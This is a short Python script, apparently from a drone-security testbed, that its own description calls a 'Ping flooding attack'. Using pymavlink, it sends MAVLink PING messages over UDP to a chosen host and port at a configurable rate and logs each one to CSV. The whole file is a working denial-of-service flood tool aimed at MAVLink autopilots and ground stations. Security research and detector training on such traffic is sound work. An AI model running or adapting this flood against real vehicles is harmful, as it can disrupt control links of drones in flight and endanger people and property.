import argparse
import csv
import time
from datetime import datetime, timezone
from pathlib import Path

from pymavlink import mavutil


def build_parser():
    parser = argparse.ArgumentParser(description="Ping flooding attack.")
    parser.add_argument("--udp", default="127.0.0.1:14550", help="Host:port for udpout.")
    parser.add_argument("--rate", type=float, default=200.0, help="Messages per second.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to run.")
    parser.add_argument("--out-dir", default=None, help="Output directory for CSV.")
    return parser


def main():
    args = build_parser().parse_args()
    out_dir = Path(args.out_dir) if args.out_dir else Path(__file__).resolve().parents[1] / "out"
    out_dir.mkdir(exist_ok=True)

    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    out_path = out_dir / f"attack_ping_{ts}.csv"

    conn = mavutil.mavlink_connection(f"udpout:{args.udp}")
    conn.mav.srcSystem = 251
    conn.mav.srcComponent = 1

    period = 1.0 / max(args.rate, 1.0)
    start = time.time()
    seq = 0

    with out_path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["timestamp", "msg_name", "msg_id", "seq"])

        while time.time() - start < args.duration:
            conn.mav.ping_send(int(time.time() * 1e6), seq, 1, 1)
            writer.writerow([time.time(), "PING", mavutil.mavlink.MAVLINK_MSG_ID_PING, seq])
            seq += 1
            time.sleep(period)


if __name__ == "__main__":
    main()
